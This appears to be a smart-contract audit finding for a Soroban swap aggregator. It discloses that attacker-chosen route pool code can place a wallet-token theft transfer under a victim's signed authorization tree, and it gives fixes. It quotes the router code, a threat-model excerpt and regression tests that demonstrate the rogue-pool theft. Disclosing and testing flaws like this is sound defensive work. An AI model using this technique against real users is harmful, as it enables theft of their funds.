### Title
Attacker-controlled swap route can include unauthorized wallet-token transfers under the caller’s authorization tree - (File: contracts/swap-aggregator/src/venues/mod.rs)

### Summary
A malicious swap route can cause the configured swap aggregator to invoke attacker-deployed pool code while executing a controller strategy. Because the route-selected code runs below the caller’s signed authorization, that code can invoke `token.transfer(caller, attacker, amount)` and have the transfer attached to the caller’s authorization tree. If the caller submits the poisoned tree returned by transaction simulation, the protocol can settle a valid strategy while unrelated wallet tokens are stolen.

### Finding Description
The controller’s `swap_collateral` entrypoint accepts a caller-supplied `swap` byte payload and passes it into `process_swap_collateral`. [1](#0-0)  After validating the caller, destination market, and account ownership, the controller withdraws the selected collateral into controller custody and invokes `swap_tokens_or_passthrough`. [2](#0-1) 

`swap_tokens` decodes the caller-controlled route only inside the configured aggregator, authorizes one exact input-token transfer, and measures only the controller’s input and output balances around `router.execute_strategy`. [3](#0-2)  The aggregator then decodes the supplied program and executes each encoded operation. [4](#0-3)  For a swap operation, the venue-specific hop contains a caller-selected `pool` address, and `dispatch_hop` sends execution through that hop while enforcing only router input/output balance deltas. [5](#0-4) [6](#0-5) 

This resembles local file inclusion: attacker-controlled route data selects executable code, while the enclosing protocol only verifies the strategy’s token accounting. The repository’s threat model explicitly notes that route-selected third-party code can put a caller-authorized token transfer beneath the strategy authorization and that neither the route minimum nor final risk gate bounds the wallet loss. [7](#0-6)  The regression test demonstrates an attacker-deployed hop contract transferring Alice’s unrelated wallet token to the attacker while still paying valid swap output. [8](#0-7) 

### Impact Explanation
The impact is theft of user funds outside the routed strategy amount. A victim may hold a token unrelated to the lending market, and the rogue hop can transfer that token to an attacker if the victim signs the authorization tree containing the malicious child invocation. The protocol’s measured output and health checks can still pass because the theft is recorded under the user’s authorization rather than as a controller or router balance inconsistency. [9](#0-8)  The test shows Alice’s entire `WALLET_BALANCE` moving to the attacker while the destination collateral is credited. [10](#0-9) 

### Likelihood Explanation
An unprivileged attacker can deploy the malicious route target and induce a victim to submit a strategy containing the malicious route through `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, or the direct router path. The wallet-facing exploit requires the victim to sign the authorization tree produced or supplied for the malicious transaction, so it depends on malicious route construction and inadequate client-side authorization validation rather than a privileged protocol role. The test proves that a signed poisoned authorization tree succeeds and moves the wallet token. [11](#0-10) 

### Recommendation
Prevent user-controlled strategy payloads from selecting arbitrary executable hop addresses. Use governance-registered or venue-verified pool addresses where the venue permits it, and make integrators decode the simulated Soroban authorization tree and reject any child invocation other than the exact expected input transfer. Protocol documentation and SDK helpers should expose a canonical authorization-tree validation function for every strategy entrypoint so the expected child set is enforced before signing. [12](#0-11) 

### Proof of Concept
The repository’s proof builds a route through `RogueHopPool`, whose `swap` function performs `token.transfer(alice, attacker, WALLET_BALANCE)` on a token unrelated to the strategy. [13](#0-12)  The router double calls the payload-selected `hop_pool` during `execute_strategy`, while the controller call is `swap_collateral(alice, account_id, USDC, amount, ETH, route)`. [14](#0-13)  Simulation records the unrelated token transfer as a child of Alice’s `swap_collateral` authorization, and submitting that signed tree causes the transfer to execute while the swap output remains valid. [10](#0-9)

```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };

    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
